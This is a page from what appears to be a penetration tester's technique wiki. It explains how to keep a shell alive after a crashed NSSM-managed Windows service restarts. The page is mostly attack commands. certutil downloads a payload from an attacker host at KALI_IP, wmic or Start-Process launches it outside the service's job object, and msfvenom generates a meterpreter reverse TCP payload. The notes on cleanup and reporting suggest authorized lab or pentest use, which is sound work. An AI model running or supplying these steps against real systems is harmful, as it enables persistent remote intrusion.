---
title: Windows NSSM Job Object Escape (WMI process spawn)
slug: windows-nssm-job-escape
category: techniques
updated: 2026-07-26
summary: "NSSM job object kills child processes on service restart — escape with wmic process call create; START /B does NOT work"
tags: [windows, nssm, job-object, wmi, persistence, shell, meterpreter]
sensitive: false
---

# Windows NSSM Job Object Escape (WMI process spawn)

## When to use
Target service is managed by NSSM. You trigger a crash (or the service crashes naturally) and get a shell from the crash handler — but every child process you launch dies when NSSM restarts the service. `START /B`, `cmd /c`, direct exec all fail: NSSM's job object kills everything in the tree.

## Key facts / commands

**Why `START /B` fails**: NSSM assigns a Job Object to the service process tree. Any child spawned inside that tree (even detached) inherits the job and is killed on service restart/termination.

**The fix — spawn outside the job via WMI**:
```cmd
wmic process call create "C:\Windows\Temp\payload.exe"
```
WMI creates the process in a new session, **outside the service's job object**. The process survives the service restart.

**Full delivery + execution pattern** (no SMB guest on Win10/2022 — use HTTP):
```cmd
REM 1. Deliver payload (from target shell)
certutil -urlcache -f http://KALI_IP:8000/payload.exe C:\Windows\Temp\payload.exe

REM 2. Launch outside job object
wmic process call create "C:\Windows\Temp\payload.exe"
```

```bash
# Kali: serve payload
cd /path/to/payloads && python3 -m http.server 8000
```

**Generate staged meterpreter payload**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o payload.exe
```

## Gotchas
- `START /B payload.exe` — still inside the job object, killed on restart. Confirmed broken on a Windows Server 2022 lab.
- `wmic process call create` returns immediately; use `session.list` or `jobs` in msfconsole to confirm the session arrived.
- NSSM may restart the service quickly — have the listener ready before triggering the crash.
- If `wmic` is absent: `powershell -c "Start-Process C:\Windows\Temp\payload.exe"` — `Start-Process` also escapes the job object.
- SMB guest access blocked on Win10/2022 (Error 1272) → use HTTP delivery via `certutil` or `python3 -m http.server`. See [[reverse-shells]].

## Cleanup / rollback
- Delete `C:\Windows\Temp\payload.exe` after session established.
- Note in report: process spawned via WMI (PPID = WmiPrvSE.exe), timestamp, payload hash.

## References
- Relacionado: [[privilege-escalation]], [[reverse-shells]], [[msfrpcd-api]], [[windows-sedebugprivilege-migrate]]
- Evidence: a Windows Server 2022 lab — FileSrv service, NSSM restart killing shells
